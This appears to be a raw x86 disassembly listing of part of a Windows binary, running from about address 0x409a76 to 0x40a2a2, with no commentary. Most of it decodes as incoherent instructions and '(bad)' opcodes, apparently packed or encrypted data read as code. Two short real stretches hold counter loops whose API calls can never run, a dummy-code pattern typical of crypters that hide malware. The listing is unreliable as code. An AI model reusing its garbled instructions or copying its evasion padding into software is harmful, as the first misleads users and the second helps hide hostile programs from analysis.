  409a76:	test   eax,0x2b0073c3
  409a7b:	mov    eax,ds:0xb1068e8b
  409a80:	pop    ds
  409a81:	sub    edi,edi
  409a83:	and    ah,BYTE PTR [edi]
  409a85:	out    dx,eax
  409a86:	sub    eax,0xcd7c7913
  409a8b:	mov    esp,DWORD PTR [eax+0x7f46769f]
  409a91:	dec    ecx
  409a92:	mov    bl,0xe5
  409a94:	div    DWORD PTR [ebx+0x3f]
  409a97:	fcmovbe st,st(6)
  409a99:	bound  esp,QWORD PTR [ecx-0x3383b3bf]
  409a9f:	ds scas eax,DWORD PTR es:[edi]
  409aa1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409aa2:	or     DWORD PTR [edi],eax
  409aa4:	xor    dh,BYTE PTR [esi]
  409aa6:	mov    bl,0x7b
  409aa8:	int3   
  409aa9:	cli    
  409aaa:	test   DWORD PTR [ebx+edi*2],ecx
  409aad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409aae:	add    al,0x6a
  409ab0:	mov    BYTE PTR [edx-0x2a],ah
  409ab3:	int    0x92
  409ab5:	cmp    eax,DWORD PTR [edx+0x413fde1b]
  409abb:	call   0xa1ae557c
  409ac0:	or     esp,esp
  409ac2:	(bad)  
  409ac3:	jb     0x409afe
  409ac5:	mov    edi,0x25c31623
  409aca:	in     eax,0x4f
  409acc:	xchg   edi,eax
  409acd:	in     al,dx
  409ace:	jb     0x409a8b
  409ad0:	test   eax,0x71e159e1
  409ad5:	lods   eax,DWORD PTR ds:[esi]
  409ad6:	pop    es
  409ad7:	mov    al,ds:0x7027c4f5
  409adc:	adc    BYTE PTR [ecx+edx*4-0xc4bb8ee],al
  409ae3:	mov    edx,0x163a034e
  409ae8:	cmp    al,0x5
  409aea:	pop    ds
  409aeb:	repnz xchg bl,dl
  409aee:	inc    esi
  409aef:	push   edi
  409af0:	outs   dx,DWORD PTR ds:[esi]
  409af1:	test   bh,bl
  409af3:	fadd   DWORD PTR cs:[edi-0x6e795503]
  409afa:	call   0x23e5:0x449af2cc
  409b01:	inc    ebp
  409b02:	test   BYTE PTR [ecx],dl
  409b04:	mov    ds:0x40937b13,eax
  409b09:	lds    ecx,FWORD PTR [edi]
  409b0b:	jns    0x409b37
  409b0d:	fld    DWORD PTR fs:[edi+0x4a]
  409b11:	mov    ds:0xc4bc362d,al
  409b16:	add    eax,0x3b9cb474
  409b1b:	sub    edi,DWORD PTR [ecx+0x67]
  409b1e:	fwait
  409b1f:	lea    ebx,[esi+0x6797108b]
  409b25:	mov    al,0xd1
  409b27:	cmp    DWORD PTR [edx],0x3f
  409b2a:	icebp  
  409b2b:	mov    esi,0x73127beb
  409b30:	stc    
  409b31:	not    DWORD PTR [eax-0x69919f62]
  409b37:	jb     0x409ba3
  409b39:	out    dx,eax
  409b3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b3b:	int    0x1d
  409b3d:	seta   dl
  409b40:	shr    DWORD PTR [edx-0x3d],1
  409b43:	add    ah,ch
  409b45:	ss iret 
  409b47:	rol    DWORD PTR [ebp+0x42e40e91],cl
  409b4d:	mov    bh,0xa8
  409b4f:	test   edi,esi
  409b51:	mov    ah,0x54
  409b53:	jae    0x409b14
  409b55:	into   
  409b56:	fwait
  409b57:	stc    
  409b58:	push   ebx
  409b59:	out    0x56,al
  409b5b:	sub    ebp,DWORD PTR [eax-0x65]
  409b5e:	xlat   BYTE PTR ds:[ebx]
  409b5f:	neg    esi
  409b61:	mov    cs,WORD PTR [eax+eiz*1+0x6f]
  409b65:	pop    eax
  409b66:	scas   al,BYTE PTR es:[edi]
  409b67:	ror    BYTE PTR [ebx-0x359decf2],0x5
  409b6e:	cmp    eax,0xc1bb44f
  409b73:	pop    es
  409b74:	das    
  409b75:	xchg   edx,eax
  409b76:	sbb    al,0xf1
  409b78:	ror    BYTE PTR [ebp-0x62],cl
  409b7b:	xor    DWORD PTR [ecx+ebp*4-0x7c],ebp
  409b7f:	and    DWORD PTR [edx-0x707514f3],edi
  409b85:	add    al,0xdb
  409b87:	rcr    DWORD PTR [edx-0x13],0xf
  409b8b:	dec    edi
  409b8c:	sub    eax,0x464bebf9
  409b91:	mov    esi,0xd53c4e03
  409b96:	sub    eax,0xd71a7038
  409b9b:	pop    esp
  409b9c:	mov    cl,0x3
  409b9e:	mov    al,0x2
  409ba0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ba1:	daa    
  409ba2:	jae    0x409bef
  409ba4:	mov    ah,0xc8
  409ba6:	mov    ebx,DWORD PTR [ecx]
  409ba8:	adc    eax,0x98ddada5
  409bad:	loope  0x409b8f
  409baf:	xchg   esp,eax
  409bb0:	ins    BYTE PTR es:[edi],dx
  409bb1:	xor    BYTE PTR ds:0x95ad0cf8,bh
  409bb7:	into   
  409bb8:	mov    ds:0x40f97bd7,eax
  409bbd:	ret    0x7abb
  409bc0:	(bad)
  409bc3:	or     eax,0x7a603009
  409bc8:	mov    ds:0x89cda16,eax
  409bcd:	pop    esi
  409bce:	jno    0x409b9e
  409bd0:	dec    edx
  409bd1:	mov    eax,0xa77dd869
  409bd6:	mov    edx,0x70a0ecdc
  409bdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bdc:	mov    eax,ds:0x54161af1
  409be1:	dec    ecx
  409be2:	(bad)  
  409be3:	scas   al,BYTE PTR es:[edi]
  409be4:	test   eax,0xcdfbb6c4
  409be9:	(bad)  
  409bea:	mov    ss,WORD PTR [ecx]
  409bec:	ficomp DWORD PTR [edx-0x2bd31f53]
  409bf2:	jmp    0x36520991
  409bf7:	pushf  
  409bf8:	cdq    
  409bf9:	sbb    BYTE PTR [ebp+0x70],dl
  409bfc:	and    cl,BYTE PTR [esi-0x213d55de]
  409c02:	mov    edx,0x53b3e500
  409c07:	cmp    eax,0x4ac19454
  409c0c:	repz push ss
  409c0e:	sub    al,ch
  409c10:	dec    esp
  409c11:	retf   
  409c12:	or     ecx,edi
  409c14:	mov    ch,0x17
  409c16:	jns    0x409baa
  409c18:	sbb    al,0x80
  409c1a:	xchg   edi,eax
  409c1b:	push   ebp
  409c1c:	(bad)  
  409c1d:	xor    al,0x2e
  409c1f:	imul   ebp,DWORD PTR ds:0x7375d416,0x4b79455e
  409c29:	mov    BYTE PTR [esi-0x384ef910],al
  409c2f:	dec    ecx
  409c30:	mov    al,ds:0xd0ae722f
  409c35:	sbb    eax,0xec9779ea
  409c3a:	stc    
  409c3b:	or     BYTE PTR [edx-0xe7fb86a],ch
  409c41:	mov    esi,0xd629ac35
  409c46:	(bad)  
  409c47:	mov    eax,0x30a93127
  409c4c:	ss jae 0x409c23
  409c4f:	ss push eax
  409c51:	xor    ah,BYTE PTR [edx-0x43b558fe]
  409c57:	retf   
  409c58:	mov    WORD PTR [esi*4-0x24293e8c],?
  409c5f:	(bad)  
  409c60:	nop
  409c61:	(bad)  
  409c62:	test   al,0xb6
  409c64:	daa    
  409c65:	xor    edx,esp
  409c67:	(bad)  
  409c68:	loope  0x409ca8
  409c6a:	test   BYTE PTR [edi-0x3c],dl
  409c6d:	add    BYTE PTR [esi],ah
  409c6f:	stos   BYTE PTR es:[edi],al
  409c70:	adc    dh,bl
  409c72:	test   DWORD PTR [esi-0x20],ecx
  409c75:	pop    edi
  409c76:	rcr    al,0xf5
  409c79:	mov    ebp,0x2bd436f
  409c7e:	pop    ebp
  409c7f:	retf   
  409c80:	dec    edi
  409c81:	lods   al,BYTE PTR ds:[esi]
  409c82:	mov    ebx,0x8b65594c
  409c87:	or     DWORD PTR [esi],ebx
  409c89:	arpl   bx,bp
  409c8b:	cmp    eax,0x7cca24db
  409c90:	fsubp  st(7),st
  409c92:	les    esp,FWORD PTR [ebp-0x43]
  409c95:	xor    eax,0x98763290
  409c9a:	cdq    
  409c9b:	cmp    esi,DWORD PTR [ecx-0x5c98eb54]
  409ca1:	sbb    eax,0x3dc675c5
  409ca6:	add    ebx,ebp
  409ca8:	inc    ebx
  409ca9:	popw   ss
  409cab:	ficomp WORD PTR ds:0xd71c79bc
  409cb1:	jo     0x409ce0
  409cb3:	(bad)  
  409cb4:	cld    
  409cb5:	ins    DWORD PTR es:[edi],dx
  409cb6:	mov    ah,0x2c
  409cb8:	push   0xb6500ad7
  409cbd:	add    eax,0x48a66bda
  409cc2:	push   edi
  409cc3:	call   0x4533:0x5e21b49c
  409cca:	lods   al,BYTE PTR ds:[esi]
  409ccb:	sti    
  409ccc:	fld    DWORD PTR [eax+0x38]
  409ccf:	imul   esi,DWORD PTR [ebx],0xd87a5f8
  409cd5:	xor    eax,0xc4a725b0
  409cda:	std    
  409cdb:	stos   DWORD PTR es:[edi],eax
  409cdc:	mov    dh,0xb2
  409cde:	push   ebx
  409cdf:	mov    al,0x26
  409ce1:	repnz ds xchg ebp,eax
  409ce4:	add    dh,BYTE PTR [eax+0x4a899b80]
  409cea:	not    BYTE PTR [esi]
  409cec:	loop   0x409c6f
  409cee:	and    BYTE PTR [eax-0x32],ah
  409cf1:	in     al,0x3e
  409cf3:	test   DWORD PTR [edx-0x7fb16084],edx
  409cf9:	add    al,0x4e
  409cfb:	cmp    BYTE PTR [edi+0x48ed781e],0x5f
  409d02:	push   ecx
  409d03:	mov    WORD PTR [edi-0x631aa86b],fs
  409d09:	add    DWORD PTR [edi+0x3e],esp
  409d0c:	out    0x68,eax
  409d0e:	not    BYTE PTR [ebx]
  409d10:	jmp    0x409d5d
  409d12:	adc    DWORD PTR [esi+ecx*1-0x6c1cf250],esp
  409d19:	mov    eax,ds:0xd9d6181d
  409d1e:	push   eax
  409d1f:	xor    ch,BYTE PTR [edi+0x505a9386]
  409d25:	sbb    eax,0xe1d55157
  409d2a:	xchg   esp,eax
  409d2b:	add    edi,DWORD PTR [eax]
  409d2d:	jne    0x409ccb
  409d2f:	loopne 0x409d64
  409d31:	dec    edx
  409d32:	ins    DWORD PTR es:[edi],dx
  409d33:	sub    bl,BYTE PTR [edx]
  409d35:	cmp    ebx,ecx
  409d37:	dec    ecx
  409d38:	mov    DWORD PTR [eax+0x62],ecx
  409d3b:	call   0x4b4b1220
  409d40:	iret   
  409d41:	test   eax,0xabf2dc65
  409d46:	in     al,dx
  409d47:	loopne 0x409ce3
  409d49:	imul   edi,DWORD PTR [edx],0x7e4961ad
  409d4f:	inc    edx
  409d50:	repz call 0xc13d:0xbaf2ea2f
  409d58:	mov    ds:0x421968fb,eax
  409d5d:	aaa    
  409d5e:	(bad)  
  409d5f:	jne    0x409dde
  409d61:	sub    cl,bl
  409d63:	mov    bl,0x7
  409d65:	bound  edi,QWORD PTR [ebx-0x21]
  409d68:	dec    eax
  409d69:	repnz push eax
  409d6b:	ret    
  409d6c:	jmp    0x71b8:0x617ef856
  409d73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d74:	xor    DWORD PTR [bx+0x664c],ebx
  409d79:	pop    ss
  409d7a:	pop    edi
  409d7b:	and    eax,edi
  409d7d:	push   esp
  409d7e:	jno    0x409dac
  409d80:	mov    cl,0xc3
  409d82:	mov    ah,0xff
  409d84:	ror    DWORD PTR [edx],1
  409d86:	repnz les ecx,FWORD PTR [edi+0x2a]
  409d8a:	imul   edx,DWORD PTR [ecx+0x72],0x6d
  409d8e:	jo     0x409df3
  409d90:	inc    ebp
  409d91:	or     DWORD PTR [esi+0x25],ebx
  409d94:	enter  0x2be0,0xf4
  409d98:	fs cdq 
  409d9a:	push   ss
  409d9b:	and    eax,0x9fd1b30d
  409da0:	lfs    esp,FWORD PTR [eax-0xc]
  409da4:	pushw  ds
  409da6:	out    dx,eax
  409da7:	in     eax,dx
  409da8:	or     eax,0xd1a95438
  409dad:	fcom   DWORD PTR [esi]
  409daf:	push   edi
  409db0:	pusha  
  409db1:	pop    ebp
  409db2:	out    dx,al
  409db3:	into   
  409db4:	mov    eax,0x9975d049
  409db9:	adc    ebx,edi
  409dbb:	mov    al,ds:0xc3632297
  409dc0:	push   ebx
  409dc1:	in     al,dx
  409dc2:	mov    cl,BYTE PTR [eax-0x62]
  409dc5:	fdivp  st(1),st
  409dc7:	push   esi
  409dc8:	mov    eax,ds:0xcf8e9f3c
  409dcd:	jae    0x409d56
  409dcf:	loopne 0x409de5
  409dd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409dd2:	sahf   
  409dd3:	(bad)  
  409dd4:	lea    ecx,[ebp+0x22]
  409dd7:	pop    esp
  409dd8:	das    
  409dd9:	adc    ah,BYTE PTR [edi+0x1e]
  409ddc:	and    eax,0x37731feb
  409de1:	push   ss
  409de2:	pop    ds
  409de3:	ror    BYTE PTR [edx+eiz*2-0x436995b0],cl
  409dea:	xchg   ebx,eax
  409deb:	js     0x409dc4
  409ded:	aas    
  409dee:	popf   
  409def:	push   esi
  409df0:	stos   BYTE PTR es:[edi],al
  409df1:	shr    DWORD PTR [ebx+0x40cfb7ef],cl
  409df7:	push   0x59
  409df9:	and    eax,0x5ca43ab2
  409dfe:	int    0xde
  409e00:	je     0x409e24
  409e02:	(bad)  
  409e03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e04:	test   eax,0x31d103cb
  409e09:	or     eax,0x42fe0a
  409e0e:	mov    DWORD PTR [ebp-0x8],edx
  409e11:	mov    edx,DWORD PTR [ebp+0x8]
  409e14:	and    edi,DWORD PTR ds:0x42fd79
  409e1a:	xor    edx,eax
  409e1c:	adc    edi,DWORD PTR ds:0x42e1a4
  409e22:	add    edx,ecx
  409e24:	mov    DWORD PTR ds:0x42fe02,0x18
  409e2e:	cmp    DWORD PTR ds:0x42fe02,0x0
  409e35:	je     0x409e63
  409e3b:	cmp    DWORD PTR ds:0x42fe02,0x1a
  409e42:	jne    0x409e51
  409e48:	push   DWORD PTR [ebp-0xc]
  409e4b:	call   DWORD PTR ds:0x42e363
  409e51:	mov    edi,DWORD PTR ds:0x42fe02
  409e57:	dec    edi
  409e58:	mov    DWORD PTR ds:0x42fe02,edi
  409e5e:	jmp    0x409e2e
  409e63:	mov    DWORD PTR [ebp+0xc],edx
  409e66:	adc    DWORD PTR ds:0x42e783,0x3e25
  409e70:	jmp    0x40a22e
  409e75:	xlat   BYTE PTR ds:[ebx]
  409e76:	mov    edi,0x699269fa
  409e7b:	mul    DWORD PTR [ecx-0x79]
  409e7e:	mov    dh,0xc4
  409e80:	(bad)  
  409e81:	cmp    edi,DWORD PTR [esi+0x17]
  409e84:	fsub   QWORD PTR [esi]
  409e86:	call   0x7de00efb
  409e8b:	jo     0x409efd
  409e8d:	or     al,0xba
  409e8f:	shl    DWORD PTR [eax-0x5b69319d],1
  409e95:	pop    esi
  409e96:	dec    ebp
  409e97:	gs jmp 0x117:0xcaa0e6ba
  409e9f:	push   ebp
  409ea0:	stc    
  409ea1:	daa    
  409ea2:	mov    al,ds:0xe672d2
  409ea7:	mov    es,WORD PTR [eax+0x353fcd23]
  409ead:	es enter 0x1ee4,0xa9
  409eb2:	test   BYTE PTR ds:0x4b969a8a,ch
  409eb8:	mov    esp,ds
  409eba:	in     eax,dx
  409ebb:	add    ah,BYTE PTR [eax-0x65ae12c8]
  409ec1:	ror    BYTE PTR [eax+ebx*1],1
  409ec4:	sbb    al,BYTE PTR [edx]
  409ec6:	add    eax,0x86e8d532
  409ecb:	push   eax
  409ecc:	pop    ecx
  409ecd:	xchg   ebp,eax
  409ece:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ecf:	hlt    
  409ed0:	retf   
  409ed1:	jbe    0x409f02
  409ed3:	test   DWORD PTR [ebx-0x706e3877],0xaacebc39
  409edd:	addr16 out 0xf0,eax
  409ee0:	sbb    DWORD PTR [eax+0x6f5b62c9],eax
  409ee6:	in     al,dx
  409ee7:	xlat   BYTE PTR ds:[ebx]
  409ee8:	mov    ebp,0xde40d7f9
  409eed:	test   al,0x8b
  409eef:	adc    DWORD PTR [ebp+0x331f483c],ebx
  409ef5:	inc    ebp
  409ef6:	aad    0x62
  409ef8:	sub    BYTE PTR [ebp+esi*2-0x15],0xd
  409efd:	cmc    
  409efe:	xor    esi,DWORD PTR [esi+ebx*8+0x21]
  409f02:	xchg   esp,eax
  409f03:	addr16 mov edi,0xac9ddf2d
  409f09:	mov    cl,cl
  409f0b:	mov    esi,0x89ce4440
  409f10:	(bad)  
  409f11:	adc    esi,ebx
  409f13:	xchg   ecx,eax
  409f14:	xchg   edi,eax
  409f15:	(bad)  
  409f16:	lock jp 0x409f05
  409f19:	adc    al,dl
  409f1b:	dec    ebp
  409f1c:	stos   DWORD PTR es:[edi],eax
  409f1d:	add    ch,BYTE PTR [ebp-0x42129eb6]
  409f23:	jmp    0x409f9f
  409f25:	push   ds
  409f26:	vmread DWORD PTR [edx+ebp*8+0x69],ecx
  409f2b:	stos   BYTE PTR es:[edi],al
  409f2c:	xor    DWORD PTR [edx-0x4],eax
  409f2f:	lahf   
  409f30:	lods   eax,DWORD PTR ds:[esi]
  409f31:	jecxz  0x409fb1
  409f33:	in     al,0x70
  409f35:	inc    ebp
  409f36:	sub    bl,BYTE PTR ds:0x6cc0d7db
  409f3c:	lea    edi,[esi+0x14]
  409f3f:	xchg   esi,eax
  409f40:	sub    DWORD PTR [edx+0x6a],edx
  409f43:	add    eax,0xf6be6d4d
  409f48:	inc    eax
  409f49:	jle    0x409ee4
  409f4b:	jp     0x409f94
  409f4d:	xchg   DWORD PTR [ebx+0x7e204df0],esp
  409f53:	pushf  
  409f54:	loop   0x409f69
  409f56:	stos   BYTE PTR es:[edi],al
  409f57:	or     eax,0x854b1b13
  409f5c:	rol    BYTE PTR ds:0x8d7b83e0,0xc3
  409f63:	rcl    BYTE PTR [edx+0x69e000b9],1
  409f69:	xor    ah,BYTE PTR [si+0x343b]
  409f6e:	js     0x409f69
  409f70:	mov    edx,0xe2e763b6
  409f75:	pop    ds
  409f76:	or     al,0x21
  409f78:	and    cl,ch
  409f7a:	lods   eax,DWORD PTR ds:[esi]
  409f7b:	mov    ch,BYTE PTR [esi+0x1]
  409f7e:	mov    al,ds:0xc2a96a48
  409f83:	mov    ch,0xe
  409f85:	cmp    ebx,esi
  409f87:	cmp    eax,0xb539ac66
  409f8c:	xchg   ebp,eax
  409f8d:	add    eax,0x84289681
  409f92:	pop    ebp
  409f93:	call   0x249e:0xc2838ece
  409f9a:	loope  0x409f95
  409f9c:	mov    ebx,DWORD PTR [eax]
  409f9e:	push   0x4cb79875
  409fa3:	add    BYTE PTR [ebx],bh
  409fa5:	push   ebp
  409fa6:	inc    esi
  409fa7:	iret   
  409fa8:	cmp    ch,BYTE PTR [edx]
  409faa:	push   ds
  409fab:	sbb    ebx,DWORD PTR ds:0x82f09b3a
  409fb1:	loopne 0x409f51
  409fb3:	push   eax
  409fb4:	or     eax,0x78afaeb5
  409fb9:	and    eax,0xe142ea95
  409fbe:	ins    BYTE PTR es:[edi],dx
  409fbf:	hlt    
  409fc0:	ins    BYTE PTR es:[edi],dx
  409fc1:	push   0x89fbf98c
  409fc6:	add    esi,DWORD PTR [esi+0x3a56df1]
  409fcc:	cmp    dh,0x4c
  409fcf:	mov    al,ds:0x4ca99b3e
  409fd4:	pop    esi
  409fd5:	jne    0x409fd6
  409fd7:	push   ebx
  409fd8:	jbe    0x40a01b
  409fda:	ja     0x40a05a
  409fdc:	ret    
  409fdd:	jb     0x40a011
  409fdf:	bnd jg 0x40a017
  409fe2:	data16 xor BYTE PTR [ecx],dl
  409fe5:	inc    esi
  409fe6:	sti    
  409fe7:	lea    esi,[esi-0xcd7564a]
  409fed:	in     al,dx
  409fee:	test   al,0x78
  409ff0:	shl    ah,0xdb
  409ff3:	cmp    ah,BYTE PTR [edi+ebp*8]
  409ff6:	stos   BYTE PTR es:[edi],al
  409ff7:	fwait
  409ff8:	arpl   di,cx
  409ffa:	jg     0x40a001
  409ffc:	adc    edi,DWORD PTR [edi-0x3912cff5]
  40a002:	aaa    
  40a003:	popa   
  40a004:	xor    esi,ebp
  40a006:	pop    es
  40a007:	fld    st(3)
  40a009:	pusha  
  40a00a:	test   DWORD PTR [eax+0x5a],ecx
  40a00d:	push   edi
  40a00e:	into   
  40a00f:	add    ah,ch
  40a011:	sbb    DWORD PTR [esi-0x4],esi
  40a014:	add    DWORD PTR ds:0x62f8d358,ecx
  40a01a:	and    al,0x7d
  40a01c:	push   esi
  40a01d:	leave  
  40a01e:	cmp    ah,BYTE PTR [esi-0x7d64e138]
  40a024:	js     0x40a05a
  40a026:	add    BYTE PTR [eax+0x4a],bh
  40a029:	mov    ds:0xca7c17a7,eax
  40a02e:	dec    eax
  40a02f:	pop    ds
  40a030:	pop    es
  40a031:	mov    ah,0xcb
  40a033:	push   edx
  40a034:	ret    
  40a035:	daa    
  40a036:	and    bh,BYTE PTR [esi+0x73]
  40a039:	mov    ds:0x467d1576,eax
  40a03e:	nop
  40a03f:	mov    ebp,0x13ec5ad2
  40a044:	dec    ebx
  40a045:	xor    cl,bh
  40a047:	cmp    eax,0xa507c529
  40a04c:	mov    ch,0xac
  40a04e:	fs mov esi,0xff4e6c3
  40a054:	loopne 0x40a030
  40a056:	ins    BYTE PTR es:[edi],dx
  40a057:	loope  0x40a0b5
  40a059:	dec    esp
  40a05a:	add    ebx,DWORD PTR [edi]
  40a05c:	jg     0x40a04a
  40a05e:	pop    edx
  40a05f:	mov    ebx,0x1ce0f541
  40a064:	sbb    eax,edx
  40a066:	and    eax,0xcdbc37d9
  40a06c:	scas   al,BYTE PTR es:[edi]
  40a06d:	mov    dh,0x34
  40a06f:	add    eax,0x6d292c7c
  40a074:	pop    ss
  40a075:	rcl    BYTE PTR [esi-0x43],0x1c
  40a079:	es rol ebp,cl
  40a07c:	pop    ds
  40a07d:	jbe    0x40a064
  40a07f:	cmp    esp,DWORD PTR [eax]
  40a081:	inc    bp
  40a083:	ret    
  40a084:	xchg   ebx,eax
  40a085:	fwait
  40a086:	mov    al,bl
  40a088:	sub    al,cl
  40a08a:	mov    ebx,0x437a2213
  40a08f:	pop    ebx
  40a090:	lahf   
  40a091:	mov    al,0xfd
  40a093:	stos   DWORD PTR es:[edi],eax
  40a094:	sbb    BYTE PTR [ebx+eiz*4+0x7fda26e1],0x6b
  40a09c:	inc    esp
  40a09d:	cwde   
  40a09e:	scas   eax,DWORD PTR es:[edi]
  40a09f:	scas   eax,DWORD PTR es:[edi]
  40a0a0:	dec    eax
  40a0a1:	imul   ebx,edi,0xffffffa7
  40a0a4:	dec    ebp
  40a0a5:	push   ss
  40a0a6:	push   0xffffffc0
  40a0a8:	ins    BYTE PTR es:[edi],dx
  40a0a9:	(bad)
  40a0ac:	jg     0x40a0f4
  40a0ae:	and    edx,DWORD PTR [edi]
  40a0b0:	push   es
  40a0b1:	jns    0x40a0c4
  40a0b3:	xchg   edx,eax
  40a0b4:	(bad)  
  40a0b5:	div    ch
  40a0b7:	jle    0x40a087
  40a0b9:	ror    DWORD PTR [esp+eax*8+0x6698854b],cl
  40a0c0:	not    BYTE PTR [esi-0x1d]
  40a0c3:	mov    eax,0xe7ea3512
  40a0c8:	jno    0x40a101
  40a0ca:	test   al,0xb6
  40a0cc:	inc    ebx
  40a0cd:	jle    0x40a089
  40a0cf:	push   cs
  40a0d0:	jecxz  0x40a14c
  40a0d2:	test   eax,esi
  40a0d4:	icebp  
  40a0d5:	mov    DWORD PTR ds:0xa8bf3c4,ebp
  40a0db:	jmp    0xd838:0xad030b87
  40a0e2:	or     dl,BYTE PTR [ebp-0x78]
  40a0e5:	jg     0x40a14b
  40a0e7:	mov    ah,0x8
  40a0e9:	mov    al,ds:0xe30d64ec
  40a0ee:	into   
  40a0ef:	push   ebp
  40a0f0:	jbe    0x40a0d5
  40a0f2:	addr16 je 0x40a0b6
  40a0f5:	cmp    BYTE PTR [eax],ch
  40a0f7:	sub    DWORD PTR [edx-0x2f5dcdf6],edi
  40a0fd:	sbb    ah,al
  40a0ff:	or     BYTE PTR es:[ebp+eiz*8+0x33],0xe3
  40a105:	scas   eax,DWORD PTR es:[edi]
  40a106:	or     ebp,ebx
  40a108:	cmp    DWORD PTR [ecx-0x4f],0x1dd0814a
  40a10f:	int3   
  40a110:	out    dx,eax
  40a111:	adc    dl,dl
  40a113:	xchg   DWORD PTR [esp+ebx*1+0x7c82b017],ebx
  40a11a:	or     DWORD PTR [ebx+0x9],edx
  40a11d:	les    edi,FWORD PTR [bp+si+0x381b]
  40a122:	sub    dl,dl
  40a124:	aad    0xbc
  40a126:	aam    0xe9
  40a128:	(bad)  
  40a129:	xor    edi,DWORD PTR [ebx]
  40a12b:	sub    al,0xfb
  40a12d:	sar    BYTE PTR [ecx+0x1649dfed],0x6c
  40a134:	xor    dl,ah
  40a136:	iret   
  40a137:	xchg   DWORD PTR [ecx+0x75],ebp
  40a13a:	cli    
  40a13b:	imul   eax,DWORD PTR [ebx],0xf
  40a13e:	or     eax,0x5c17a010
  40a143:	scas   eax,DWORD PTR es:[edi]
  40a144:	pop    ds
  40a145:	cmp    edx,DWORD PTR ds:0x2d9e63c3
  40a14b:	or     eax,0x6707280d
  40a150:	xchg   esp,eax
  40a151:	and    ch,bl
  40a153:	outs   dx,DWORD PTR ds:[esi]
  40a154:	(bad)  
  40a155:	das    
  40a156:	push   DWORD PTR [eax]
  40a158:	pop    ecx
  40a159:	push   edx
  40a15a:	bound  ecx,QWORD PTR [eax]
  40a15c:	(bad)  
  40a15d:	add    eax,0xa06d3a9b
  40a162:	outs   dx,BYTE PTR ds:[esi]
  40a163:	fwait
  40a164:	jmp    0x40a177
  40a166:	js     0x40a1c5
  40a168:	lods   al,BYTE PTR ds:[esi]
  40a169:	stc    
  40a16a:	cmp    eax,0x4efa367
  40a16f:	push   es
  40a170:	cmp    ch,0xe2
  40a173:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a174:	pop    esp
  40a175:	clc    
  40a176:	jns    0x40a185
  40a178:	dec    esi
  40a179:	mov    cl,0xbf
  40a17b:	and    DWORD PTR [esi+0x7c247aec],edi
  40a181:	xchg   ebp,eax
  40a182:	mov    eax,ds:0x3d0919b8
  40a187:	jnp    0x40a13f
  40a189:	imul   ebp,DWORD PTR [ebx-0x40e83104],0xa7390fd8
  40a193:	imul   esp,DWORD PTR ds:0xb2f64875,0xffffffa8
  40a19a:	jl     0x40a214
  40a19c:	popf   
  40a19d:	dec    ecx
  40a19e:	and    BYTE PTR [edi],0x9a
  40a1a1:	out    dx,al
  40a1a2:	ret    
  40a1a3:	cld    
  40a1a4:	and    al,bh
  40a1a6:	xchg   ebp,eax
  40a1a7:	int3   
  40a1a8:	mov    ah,BYTE PTR [esi+0x34]
  40a1ab:	(bad)  
  40a1ac:	lahf   
  40a1ad:	xchg   al,cl
  40a1af:	popa   
  40a1b0:	test   edx,esp
  40a1b2:	mov    ch,0xc0
  40a1b4:	jns    0x40a226
  40a1b6:	clc    
  40a1b7:	scas   al,BYTE PTR es:[edi]
  40a1b8:	mov    esp,0x1e4e1f7a
  40a1bd:	mov    ds:0xee01f7dd,eax
  40a1c2:	xchg   edx,eax
  40a1c3:	fdiv   QWORD PTR [edi+0x66]
  40a1c6:	pop    ebx
  40a1c7:	pop    esi
  40a1c8:	xchg   edi,eax
  40a1c9:	cmc    
  40a1ca:	xor    ecx,0x5d3a31e7
  40a1d0:	add    BYTE PTR [esi+0x48],bl
  40a1d3:	mov    ch,0x5e
  40a1d5:	mov    esp,0xe670d70c
  40a1da:	bnd jb 0x40a1ec
  40a1dd:	nop
  40a1de:	enter  0x253d,0x63
  40a1e2:	fdivr  DWORD PTR [eax]
  40a1e4:	fild   DWORD PTR [ecx-0x18]
  40a1e7:	inc    esi
  40a1e8:	mov    cl,0x43
  40a1ea:	xor    ebx,DWORD PTR ds:0xf45c5949
  40a1f0:	cmp    eax,0x334be8cc
  40a1f5:	es xor dh,bl
  40a1f8:	lods   eax,DWORD PTR ds:[esi]
  40a1f9:	xchg   ebp,eax
  40a1fa:	les    edi,FWORD PTR [ecx]
  40a1fc:	or     al,0x91
  40a1fe:	and    ecx,ebx
  40a200:	adc    DWORD PTR [eax-0x3d],edx
  40a203:	inc    esi
  40a204:	mov    ah,0xf9
  40a206:	lods   eax,DWORD PTR ds:[esi]
  40a207:	call   0x108974e8
  40a20c:	or     al,0x85
  40a20e:	jo     0x40a24a
  40a210:	(bad)  
  40a211:	and    BYTE PTR [esi+0x365e47ad],bl
  40a217:	xchg   BYTE PTR [ebp-0x8],bl
  40a21a:	inc    eax
  40a21b:	and    al,BYTE PTR ds:0x68fe63de
  40a221:	inc    esp
  40a222:	pop    ss
  40a223:	lds    ecx,FWORD PTR [edx-0x1f]
  40a226:	repz push 0x4d
  40a229:	or     eax,0xa827043c
  40a22e:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  40a235:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  40a23c:	adc    edx,edx
  40a23e:	mov    DWORD PTR [ebp-0x2c],0xf89c8532
  40a245:	and    DWORD PTR ds:0x42fd6d,0x0
  40a24f:	jmp    0x40a263
  40a254:	xor    edx,edx
  40a256:	or     edx,DWORD PTR ds:0x42fd6d
  40a25c:	inc    edx
  40a25d:	mov    DWORD PTR ds:0x42fd6d,edx
  40a263:	cmp    DWORD PTR ds:0x42fd6d,0x10
  40a26a:	jae    0x40a2a2
  40a270:	cmp    DWORD PTR ds:0x42fd6d,0x14
  40a277:	jne    0x40a297
  40a27d:	push   0x83c5
  40a282:	push   0x5a78
  40a287:	push   0x49ef
  40a28c:	push   0x22e4
  40a291:	call   DWORD PTR ds:0x42e367
  40a297:	jmp    0x40a254
  40a29c:	add    DWORD PTR ds:0x42e1a8,edx
  40a2a2:	mov    DWORD PTR [ebp-0x30],0xf89c853d
